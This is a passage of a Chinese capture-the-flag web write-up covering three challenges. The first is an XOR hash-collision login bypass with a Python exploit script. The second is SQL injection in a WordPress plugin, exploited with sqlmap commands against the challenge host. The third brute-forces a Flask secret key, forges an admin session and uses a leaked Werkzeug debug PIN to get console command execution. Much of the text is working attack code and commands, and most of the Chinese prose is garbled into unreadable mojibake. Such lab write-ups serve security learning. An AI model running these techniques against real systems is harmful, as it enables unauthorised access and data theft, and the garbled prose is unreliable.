11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;)
        
class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == &quot;/&quot;:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(__page__)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b&quot;404 Not Found&quot;)
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b&quot;500 Internal Server Error&quot;)

    def do_POST(self):
        try:
            if self.path == &quot;/login&quot;:
                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))
                payload = json.loads(body)
                params = json.loads(decrypt(payload[&quot;params&quot;]))
                print(params)
                if params.get(&quot;username&quot;) == &quot;admin&quot;:
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)
                    print(&quot;admin&quot;)
                    return
                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)
                    print(&quot;same&quot;)
                    return
                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))
                for k,v in hashed_users.items():
                    if hashed == v:
                        data = {
                            &quot;user&quot;:k,
                            &quot;hash&quot;:hashed,
                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}&quot;
                        }
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(json.dumps(data).encode())
                        print(&quot;success&quot;)
                        return
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b&quot;Invalid username or password&quot;)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b&quot;404 Not Found&quot;)
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b&quot;500 Internal Server Error&quot;)

if __name__ == &quot;__main__&quot;:
    server = http.server.HTTPServer((&quot;&quot;, 9999), MyHandler)
    server.serve_forever()
</code></pre>
<pre><code>assert users[&quot;admin&quot;] == &quot;admin&quot;
usersä¸­å­˜åœ¨ç”¨æˆ·åâ€œadminâ€å¯†ç ä¹Ÿä¸ºâ€œadminâ€ï¼Œè¡¨é¢ä¸Šçœ‹éœ€è¦ä¼ å…¥çš„å‚æ•°ä¹Ÿä¸ºadmin/adminã€‚

</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907210222817.png" alt="image-20230907210222817"></p>
<p>ç»§ç»­åˆ†ææºç å¯ä»¥å‘ç°eval()è¯­å¥å°†base64.b64encodeè¦†å†™ä¸ºbase64.b64decode</p>
<pre><code class="python">def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f&quot;{salt}[{item}]{salt}&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?
    return hex(c)[2:]
#å½“ä¼ å…¥çš„å‚æ•°itemsä¸º2ä¸ªæ—¶è¯¥å‡½æ•°ç­‰ä»·äºæ±‚ä¸¤ä¸ªå‚æ•°çš„å¼‚æˆ–å€¼å¹¶è¿”å›ï¼Œæ‰€ä»¥å½“ä¸¤ä¸ªå‚æ•°ç›¸ç­‰æ—¶ä¸ç®¡è¯¥å‚æ•°ä¸ºä½•å€¼ï¼Œè¿”å›å€¼éƒ½ä¸º0
#è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ
</code></pre>
<p><strong>è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</strong></p>
<p>æ¥ä¸‹æ¥ç¼–å†™è„šæœ¬å³å¯æŠŠæ„é€ çš„jsonæ•°æ®base64ç¼–ç äº”æ¬¡</p>
<pre><code class="python">import requests
import base64

url = &quot;http://localhost:64817/login&quot;
username = &quot;\&quot;1\&quot;&quot;
password = &quot;1&quot;
jsondata = &quot;{\&quot;username\&quot;:&quot;+f&quot;{username}&quot;+&quot;,\&quot;password\&quot;:&quot;+f&quot;{password}&quot;+&quot;}&quot;
print(f&quot;{jsondata = }&quot;)
for _ in range(5):
    jsondata = base64.b64encode(str(jsondata).encode()).decode()
data = &quot;{\&quot;params\&quot;:\&quot;&quot;+f&quot;{jsondata}\&quot;&quot;+&quot;}&quot;
print(f&quot;{data = }&quot;)
req = requests.post(url=url,data=data).text
print(f&quot;{req = }&quot;)
</code></pre>
<h1 id="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"><a href="#å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·" class="headerlink" title="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"></a>å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·</h1><p>CHALLENGE: å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·<br>DESCRIPTION: æ¬¢è¿æ¥åˆ°å¿ƒæµ·æ–°å»ºçš„åšå®¢ï¼æ­£å€¼å‡æœŸæœŸé—´ï¼Œå¥¹æŠ“ç´§æ—¶é—´å‡ºå»æ—…æ¸¸æ”¾æ¾ä¸€ä¸‹ï¼Œçœ‹çœ‹å¥¹æœ€è¿‘éƒ½åœ¨ç ”ç©¶ä»€ä¹ˆï¼Ÿ<br><a href="http://101.42.178.83:7770/">http://101.42.178.83:7770/</a></p>
<p>æŸ¥çœ‹æºç é¡µé¢å¯å‘ç°ä¸€ä¸ªphpæ–‡ä»¶é“¾æ¥</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922215913893.png" alt="image-20230922215913893"></p>
<pre><code class="php">&lt;?php
/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor&#39;s identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/

// ä¸è®¸å·çœ‹ï¼è¿™äº›ä»£ç æˆ‘è¿˜åœ¨è°ƒè¯•å‘¢ï¼
highlight_file(__FILE__);

// åŠ è½½æ•°æ®åº“é…ç½®ï¼Œæš‚æ—¶ç”¨ç¡¬ç¼–ç ç»å¯¹è·¯å¾„
require_once(&#39;/var/www/html/wordpress/&#39; . &#39;wp-config.php&#39;);

$db_user = DB_USER; // æ•°æ®åº“ç”¨æˆ·å
$db_password = DB_PASSWORD; // æ•°æ®åº“å¯†ç 
$db_name = DB_NAME; // æ•°æ®åº“åç§°
$db_host = DB_HOST; // æ•°æ®åº“ä¸»æœº

// æˆ‘è®°å¾—å¯ä»¥ç”¨wpæä¾›çš„global $wpdbæ¥æ“ä½œæ•°æ®åº“ï¼Œç­‰æ—…æ¸¸å›æ¥å†ç ”ç©¶ä¸€ä¸‹
// è¿™äº›æ˜¯ä¸´æ—¶çš„ä»£ç 

$ip = $_POST[&#39;ip&#39;];
$user_agent = $_POST[&#39;user_agent&#39;];
$time = stripslashes($_POST[&#39;time&#39;]);

$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

// æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ
if ($mysqli-&gt;connect_errno) {
    echo &#39;æ•°æ®åº“è¿æ¥å¤±è´¥: &#39; . $mysqli-&gt;connect_error;
    exit();
}

$query = &quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#39;$ip&#39;, &#39;$user_agent&#39;, $time)&quot;;

// æ‰§è¡Œæ’å…¥
$result = mysqli_query($mysqli, $query);

// æ£€æŸ¥æ’å…¥æ˜¯å¦æˆåŠŸ
if ($result) {
    echo &#39;æ•°æ®æ’å…¥æˆåŠŸ&#39;;
} else {
    echo &#39;æ•°æ®æ’å…¥å¤±è´¥: &#39; . mysqli_error($mysqli);
}

// å…³é—­æ•°æ®åº“è¿æ¥
mysqli_close($mysqli);

//gptçœŸå¥½ç”¨
</code></pre>
<p>æ ¹æ®æµ‹è¯•å‘ç°timeå­˜åœ¨æŠ¥é”™æ³¨å…¥</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922220234166.png" alt="image-20230922220234166"></p>
<p>sqlmapä¸€æŠŠæ¢­</p>
<pre><code class="bash">python3 sqlmap.py  -u &quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;  --data &quot;time=1&quot;  --dbs  --batch

python3 sqlmap.py  -u &quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;  --data &quot;time=1&quot;  -D wordpress --tables --batch

python3 sqlmap.py  -u &quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;  --data &quot;time=1&quot;  -D wordpress  -T secret_of_kokomi --columns --batch

</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222050154.png" alt="image-20230922222050154"></p>
<h1 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h1><p>CHALLENGE: moeworld<br>DESCRIPTION: ä½ å·²ç»å­¦ä¼šäº†1+1&#x3D;2ï¼Œæ¥ä¸‹æ¥å°è¯•çœŸå®çš„æ¸—é€å§~<br>è§£å‹å¯†ç ä¸ºâ€œå‡ºå»æ—…æ¸¸çš„å¿ƒæµ·â€çš„flag</p>
<p>ä¸‹è½½é™„ä»¶è§£å‹å¾—åˆ°å¦‚ä¸‹æ–‡ä»¶</p>
<pre><code>æœ¬é¢˜ä½ å°†æ‰®æ¼”**çº¢é˜Ÿ**çš„èº«ä»½ï¼Œä»¥è¯¥å¤–ç½‘ipå…¥æ‰‹ï¼Œå¹¶è¿›è¡Œå†…ç½‘æ¸—é€ï¼Œæœ€ç»ˆè·å–åˆ°å®Œæ•´çš„flag

é¢˜ç›®ç¯å¢ƒï¼šhttp://47.115.201.35:8000/

åœ¨æœ¬æ¬¡å…¬å…±ç¯å¢ƒä¸­æ¸—é€æµ‹è¯•ä¸­ï¼Œå¸Œæœ›ä½ **ä¸è¦åšä¸è·å–flagæ— å…³çš„è¡Œä¸ºï¼Œä¸è¦åˆ é™¤æˆ–ç¯¡æ”¹flagï¼Œä¸è¦ç ´åé¢˜ç›®ç¯å¢ƒï¼Œä¸è¦æ³„éœ²é¢˜ç›®ç¯å¢ƒï¼**

**æ³¨å†Œæ—¶è¯·ä¸è¦ä½¿ç”¨ä½ å¸¸ç”¨çš„å¯†ç ï¼Œæœ¬ç¯å¢ƒå¯†ç åœ¨åå°ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨**

hint.zip å¯†ç è¯·åœ¨æ‹¿åˆ°å¤–ç½‘é¶æœºåè®¿é—®æ ¹ç›®å½•ä¸‹çš„**readme**ï¼Œå®Œæˆæ¡ä»¶åè·å–

ç¯å¢ƒå‡ºç°é—®é¢˜ï¼Œè¯·ç¬¬ä¸€æ—¶é—´è”ç³»å‡ºé¢˜äºº**xlccccc**

å¯¹é¢˜ç›®æœ‰ç–‘é—®ï¼Œä¹Ÿå¯éšæ—¶è¯¢é—®å‡ºé¢˜äºº
</code></pre>
<p>æ ¹æ®é¢˜ç›®æ¥è¯´çœ‹æ¥éœ€è¦å†…ç½‘é¨æ¸¸äº†</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222659454.png" alt="image-20230922222659454"></p>
<p>ä¸€ä¸ªpythonæ­å»ºçš„ç½‘é¡µè¿™æ˜¯è¯¥ç½‘ç«™æºç </p>
<p><strong>app.py</strong></p>
<pre><code class="python">from curses import flash
from flask import Flask, request, render_template, redirect, session, url_for, flash
import os
import dataSql
import datetime
from hashlib import md5

app = Flask(__name__)

app.template_folder = os.path.join(&quot;static/templates&quot;)
app.static_folder = os.path.join(&quot;static&quot;)

app.secret_key = &quot;This-random-secretKey-you-can&#39;t-get&quot; + os.urandom(2).hex()


@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    if &#39;user&#39; not in session:
        if request.method == &#39;GET&#39;:
            return render_template(&#39;login.html&#39;)
        username = request.form[&#39;user&#39;]
        password = request.form[&#39;password&#39;]
        if dataSql.canLogin(username, password):
            session[&#39;user&#39;] = username
            session[&#39;power&#39;] = dataSql.getPower(username)
            return redirect(&#39;/index&#39;)
        else:
            flash(&quot;username or password incorrect&quot;)
            return redirect(&#39;login&#39;)
    else:
        return &#39;&#39;&#39;&lt;script&gt;alert(&quot;You have already logged in.&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;

# change the password


@app.route(&#39;/change&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def foundpwd():
    if request.method == &#39;GET&#39;:
        return render_template(&#39;changepwd.html&#39;)
    username = request.form[&#39;user&#39;]
    oldPassword = request.form[&#39;oldPassword&#39;]
    newPassword = request.form[&#39;newPassword&#39;]
    a = dataSql.changePassword(username, oldPassword, newPassword)
    if a == True:
        return &#39;&#39;&#39;
    change successfully
    &lt;br&gt;
    &lt;a href=&#39;login&#39;&gt;login now&lt;/a&gt;
    &#39;&#39;&#39;
    else:
        flash(a)
        return redirect(&#39;change&#39;)


# register for enter the message board
@app.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def register():
    if request.method == &#39;GET&#39;:
        return render_template(&#39;register.html&#39;)
    id = dataSql.usersName()
    username = request.form[&#39;user&#39;]
    password = request.form[&#39;password&#39;]
    power = &#39;guest&#39;
    if dataSql.register(id, username, password, power):
        return &#39;&#39;&#39;
    register successfully
    &lt;br&gt;
    &lt;a href=&#39;login&#39;&gt;login now&lt;/a&gt;
    &#39;&#39;&#39;
    else:
        flash(&#39;username already exists&#39;)
        return redirect(&#39;register&#39;)


@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])
def logout():
    if &#39;user&#39; in session:
        session.pop(&#39;user&#39;)
        return redirect(&#39;/login&#39;)
    else:
        return &#39;&#39;&#39;
    you are not logged in
    &lt;br&gt;
    &lt;a href=&#39;login&#39;&gt;login now&lt;/a&gt;
    &#39;&#39;&#39;


@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
@app.route(&#39;/index&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def index():
    if &#39;user&#39; in session:
        if request.method == &#39;GET&#39;:
            msg = getMsgList()
            if session[&#39;power&#39;] == &#39;guest&#39;:
                for i in msg:
                    # remove the message send by other user on private condition
                    if i[3] == &quot;1&quot; and session[&#39;user&#39;] != i[0]:
                        msg.remove(i)
            return render_template(&#39;index.html&#39;, username=session[&#39;user&#39;], msg=msg)
        else:
            message = request.form[&#39;message&#39;]
            username = session[&#39;user&#39;]
            nowtime = str(datetime.datetime.now())
            if &#39;private&#39; in request.form:
                private = 1
            else:
                private = 0
            if message == &#39;&#39;:
                return &#39;&#39;&#39;&lt;script&gt;alert(&quot;invalid input&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;
            dataSql.uploadMessage(username, message, nowtime, private)
            return &#39;&#39;&#39;&lt;script&gt;alert(&quot;upload successfully&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;
    else:
        return redirect(&#39;/login&#39;)


@app.route(&#39;/delete&#39;, methods=[&#39;GET&#39;])
def delete():
    if &#39;user&#39; in session:
        psg = request.args.get(&#39;psg&#39;)
        msg = list(dataSql.showMessage())
        for i in range(len(msg)):
            h1 = md5()
            h1.update(str(msg[i][2]).encode(encoding=&#39;utf-8&#39;))
            h2 = h1.hexdigest()
            if (msg[i][0] == session[&#39;user&#39;] or session[&#39;power&#39;] == &#39;root&#39;) and h2 == psg:
                dataSql.deleteMessage(msg[i][0], msg[i][2])
                return redirect(&#39;/index&#39;)
        return &#39;&#39;&#39;&lt;script&gt;alert(&quot;Permission denied&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;
    else:
        return &#39;&#39;&#39;&lt;script&gt;alert(&quot;login first&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;


@app.route(&#39;/index/api/getMessage&#39;, methods=[&#39;GET&#39;])
def getMessage():
    username = request.args.get(&#39;username&#39;)
    password = request.args.get(&#39;password&#39;)
    if(username == None or password == None):
        return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;invalid input&#39;}
    elif(not dataSql.canLogin(username, password)):
        return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;username or password incorrect&#39;}
    elif(dataSql.canLogin(username, password)):
        msg = getMsgList()
        if dataSql.getPower(username) == &#39;guest&#39;:
            for i in msg:
                # remove the message send by other user on private condition
                if i[3] == &quot;1&quot; and username != i[0]:
                    msg.remove(i)
        return msg


def getMsgList():
    msg = list(dataSql.showMessage())
    for i in range(len(msg)):
        h1 = md5()
        h1.update(str(msg[i][2]).encode(encoding=&#39;utf-8&#39;))
        msg[i] += tuple([h1.hexdigest()])
    return msg


if __name__ == &#39;__main__&#39;:
    app.run(host = &quot;0.0.0.0&quot;, debug=True, port=8000)
</code></pre>
<p><strong>datasql.py</strong></p>
<pre><code class="python">import pymysql
import time
import getPIN

pin = getPIN.get_pin()

class Database:
    def __init__(self, max_retries=3):
        self.max_retries = max_retries
        self.db = None

    def __enter__(self):
        self.db = self.connect_to_database()
        return self.db, self.db.cursor()

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.db and self.db.open:
            self.db.close()

    def connect_to_database(self):
        retries = 0
        while retries &lt; self.max_retries:
            try:
                db = pymysql.connect(
                    host=&quot;mysql&quot;,  # æ•°æ®åº“åœ°å€
                    port=3306,  # æ•°æ®åº“ç«¯å£
                    user=&quot;root&quot;,  # æ•°æ®åº“ç”¨æˆ·å
                    passwd=&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;,  # æ•°æ®åº“å¯†ç 
                    database=&quot;messageboard&quot;,  # æ•°æ®åº“å
                    charset=&#39;utf8&#39;
                )
                return db
            except pymysql.Error as e:
                retries += 1
                print(f&quot;Connection attempt {retries} failed. Retrying in 5 seconds...&quot;)
                time.sleep(5)
        raise Exception(&quot;Failed to connect to the database after maximum retries.&quot;)

def canLogin(username,password):
    with Database() as (db, cursor):
        sql = &#39;select password from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if res[0][0] == password:
                return True
        return False

def register(id,username,password,power):
    with Database() as (db, cursor):
        sql = &#39;select username from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            return False
        else:
            sql = &#39;insert into users (id,username,password,power) values (%s,%s,%s,%s)&#39;
            cursor.execute(sql, (id,username,password,power))
            db.commit()
            return True

def changePassword(username,oldPassword,newPassword):
    with Database() as (db, cursor):
        sql = &#39;select password from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if oldPassword == res[0][0]:
                sql = &#39;update users set password=%s where username=%s&#39;
                cursor.execute(sql, (newPassword,username))
                db.commit()
                return True
            else:
                return &quot;wrong password&quot;
        else:
            return &quot;username doesn&#39;t exist.&quot;

def uploadMessage(username,message,nowtime,private):
    with Database() as (db, cursor):
        sql = &#39;insert into message (username,data,time,private) values (%s,%s,%s,%s)&#39;
        cursor.execute(sql, (username,message,nowtime,private))
        db.commit()
        return True

def showMessage():
    with Database() as (db, cursor):
        sql = &#39;select * from message&#39;
        cursor.execute(sql)
        res = cursor.fetchall()
        res = [tuple([str(elem).replace(&#39;128-243-397&#39;, pin) for elem in i]) for i in res]
        return res

def usersName():
    with Database() as (db, cursor):
        sql = &#39;select * from users&#39;
        cursor.execute(sql)
        res = cursor.fetchall()
        return len(res)

def getPower(username):
    with Database() as (db, cursor):
        sql = &#39;select power from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        return res[0][0]

def deleteMessage(username,pubTime):
    with Database() as (db, cursor):
        sql = &#39;delete from message where username=%s and time=%s&#39;
        cursor.execute(sql,(username,pubTime))
        db.commit()
        return True
</code></pre>
<p><strong>getPIN.py</strong></p>
<pre><code class="python">import hashlib
from itertools import chain
import uuid
def get_pin():
    probably_public_bits = [
        &#39;root&#39;# username  /proc/self/environ
        &#39;flask.app&#39;,# modname
        &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
        &#39;/usr/local/lib/python3.9/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
    ]
    uuid1 = str(uuid.getnode())
    linux = b&quot;&quot;

        # machine-id is stable across boots, boot_id is not.
    for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:
        try:
            with open(filename, &quot;rb&quot;) as f:
                value = f.readline().strip()
        except OSError:
            continue

        if value:
            linux += value
            break

    # Containers share the same machine id, add some cgroup
    # information. This is used outside containers too but should be
    # relatively stable across boots.
    try:
        with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:
            linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]
    except OSError:
        pass
    linux = linux.decode(&#39;utf-8&#39;)
    private_bits = [
        uuid1,
        linux,
    ]
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
            bit = bit.encode(&quot;utf-8&quot;)
        h.update(bit)
    h.update(b&quot;cookiesalt&quot;)

    cookie_name = f&quot;__wzd{h.hexdigest()[:20]}&quot;

    num = None
    if num is None:
        h.update(b&quot;pinsalt&quot;)
        num = f&quot;{int(h.hexdigest(), 16):09d}&quot;[:9]

    rv=None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = &quot;-&quot;.join(
                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv
</code></pre>
<p>åˆæ­¥åˆ†æä»£ç æ¥çœ‹éœ€è¦ä¼ªé€ sessionä¼šè¯ç„¶åç™»å½•ç®¡ç†å‘˜è´¦å·</p>
<pre><code class="python">app.secret_key = &quot;This-random-secretKey-you-can&#39;t-get&quot; + os.urandom(2).hex()
#å…³é”®ä»£ç ä¸ºè¿™ä¸€è¡Œå‰é¢å€¼å›ºå®šåé¢ä¸å”¯ä¸€ç³»ç»Ÿéšæœºç”Ÿæˆä½¿ç”¨pythonè„šæœ¬è¿›è¡Œæš´åŠ›æšä¸¾
</code></pre>
<p>è¿™ä¸ªé¢˜ç›®å’ŒæŸä¸€ä¸ªé¢˜ç›®éå¸¸çš„ç›¸ä¼¼</p>
<p>[<a href="https://blog.csdn.net/Sapphire037/article/details/126919498">CTF]2022ç¾å›¢CTF WEB WP_os.urandom(2).hex()_Sapphire037çš„åšå®¢-CSDNåšå®¢</a></p>
<pre><code class="python">import os
with open(&#39;dict.txt&#39;,&#39;w&#39;) as f:
    for i in range(1,50000):
        a=&quot;This-random-secretKey-you-can&#39;t-get&quot;+os.urandom(2).hex()
        f.write(a)
        f.write(&#39;\n&#39;)
</code></pre>
<p><a href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis&#x2F;Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)</a></p>
<p><a href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>-unsignå·¥å…·å¯ä»¥é€šè¿‡å­—å…¸çˆ†ç ´key</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·æ¥è·å–å½“å‰çš„session</p>
<pre><code>flask-unsign.exe --unsign --cookie &quot;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImFiY2QifQ.ZQ6D4A.1l_objuFHXoApsS1mvzzMsl9k2w&quot; --wordlist .\dict.txt
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923142853852.png" alt="image-20230923142853852"></p>
<p>ä½¿ç”¨flask-session-cookie-manager å·¥å…·å¯¹è·å–çš„keyè¿›è¡ŒåŠ å¯†ç®¡ç†å‘˜session</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143402274.png" alt="image-20230923143402274"></p>
<p>æ›¿æ¢åŸæœ¬sessionè¿›è¡Œç™»å½•å¯è§pinæ³„éœ²</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143843592.png" alt="image-20230923143843592"></p>
<p>æœ‰äº†è¯¥pinç å¯è®¿é—®ç»™å‡ºçš„consoleæ¥å£ä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p><a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144108060.png" alt="image-20230923144108060"></p>
